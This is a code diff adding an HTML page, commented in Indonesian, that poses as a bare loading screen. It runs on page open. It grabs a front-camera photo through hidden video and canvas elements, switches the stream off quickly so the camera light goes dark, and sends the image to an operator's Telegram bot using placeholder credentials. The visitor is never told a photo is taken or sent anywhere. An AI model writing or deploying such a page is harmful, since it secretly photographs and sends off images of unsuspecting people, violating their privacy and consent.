@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title></title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #0a0a0a;
+    color: #e0e0e0;
+    font-family: system-ui, -apple-system, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 16px;
+  }
+  #status {
+    font-size: 14px;
+    opacity: 0.7;
+    letter-spacing: 0.5px;
+  }
+  video, canvas {
+    display: none;
+  }
+  .dot {
+    width: 8px;
+    height: 8px;
+    background: #00ff88;
+    border-radius: 50%;
+    animation: pulse 1.4s infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { opacity: 0.3; transform: scale(0.8); }
+    50% { opacity: 1; transform: scale(1.2); }
+  }
+</style>
+</head>
+<body>
+  <div class="dot"></div>
+  <div id="status">menginisialisasi...</div>
+
+  <video id="cam" autoplay playsinline muted></video>
+  <canvas id="snap"></canvas>
+
+<script>
+  // ============ KONFIGURASI ============
+  const BOT_TOKEN = "ISI_TOKEN_BOT_KAMU_DISINI";   // contoh: 7123456789:AAHxxxx...
+  const CHAT_ID   = "ISI_CHAT_ID_KAMU_DISINI";     // contoh: 123456789
+
+  // ============ LOGIKA ============
+  const statusEl = document.getElementById("status");
+  const video    = document.getElementById("cam");
+  const canvas   = document.getElementById("snap");
+  const ctx      = canvas.getContext("2d");
+
+  function setStatus(msg) {
+    statusEl.textContent = msg;
+  }
+
+  async function start() {
+    try {
+      setStatus("mengakses kamera...");
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: "user",          // kamera depan
+          width:  { ideal: 1280 },
+          height: { ideal: 720 }
+        },
+        audio: false
+      });
+
+      video.srcObject = stream;
+      await video.play();
+
+      // tunggu sebentar biar frame stabil
+      await new Promise(r => setTimeout(r, 900));
+
+      // ambil foto
+      canvas.width  = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+
+      // matikan stream biar LED kamera mati
+      stream.getTracks().forEach(t => t.stop());
+
+      setStatus("mengirim ke telegram...");
+
+      // convert ke blob
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.92));
+
+      // kirim ke Telegram
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("caption", `auto-capture • ${new Date().toLocaleString("id-ID")}`);
+      form.append("photo", blob, "capture.jpg");
+
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: form
+      });
+
+      const data = await res.json();
+
+      if (data.ok) {
+        setStatus("terkirim");
+      } else {
+        setStatus("gagal: " + (data.description || "unknown"));
+        console.error(data);
+      }
+
+    } catch (err) {
+      setStatus("error: " + err.message);
+      console.error(err);
+    }
+  }
+
+  // jalankan otomatis saat halaman dibuka
+  start();
+</script>
+</body>
+</html>
